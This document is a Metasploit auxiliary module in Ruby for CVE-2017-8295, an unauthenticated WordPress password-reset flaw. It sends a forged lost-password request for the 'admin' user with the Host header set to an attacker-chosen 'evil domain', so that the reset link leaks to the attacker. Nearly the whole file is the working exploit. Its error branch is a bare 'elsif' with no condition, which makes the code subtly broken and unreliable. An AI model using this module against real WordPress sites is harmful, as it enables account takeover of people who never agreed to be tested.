##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

include Msf::Exploit::Remote::HttpClient
include Msf::Auxiliary::Report

def initialize (info ={})
 	super(update_info(info,
		'Name'		=>	'password reset',
		'version'	=>	'$Revision: 1$',
		'Description'	=>	'Wordpress has a password reset feature that contains a vulnerability which might in some cases allow attackers to get hold of the password reset link without previous authentication. Such attack could lead to an attacker gaining unauthorised access to a victim\'s WordPress account. https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html',
		'Author'	=>
			[
			'Dawid Golunski',#Discovered
			'cyberheartmi9', #public exploit
			'Roberto Focke'  #Metasploit version
			],
		'License'	=>	MSF_LICENSE,
		'References'	=> 
				[
					['CVE', '2017-8295'],
					['BID','98295'],
					['URL', 'https://www.exploit-db.com/exploits/41963/']
				],
		'Targets'	=>
		[['WordPress <= 4.7.4',{#
		}
		],
		],
		'DisclosureDate'	=> '03/05/2017'))
	register_options(
      [
        OptInt.new('RPORT', [ true, 'remote port',  '80']),
	OptString.new('RHOST', [ true, 'remote host']),
	OptString.new('EVILDOMAIN', [ true, 'evil domain'])
	], self.class)
end

def run
	postrequest="wp-submit=Get%20New%20Password&user_login=admin&redirect_to=wp-submit"
	res=send_request_cgi({
		'method'	=>'POST',
		'uri'		=>normalize_uri('/wp-login.php?action=lostpassword'),
		'data'		=>postrequest,
                'vhost'		=>datastore['EVILDOMAIN']
				},)
		if (res.nil?)
				print_error("no response for #{rhost}:#{rport}")
				return
		elsif ( res.code == 200)
				print_good("we received the 200 printing response body")
				print_good("#{res.body}")
		elsif
				print_error("Received a #{res.code} for the request")
				print_error("#{res.headers}")
				return
		end			
	end
end
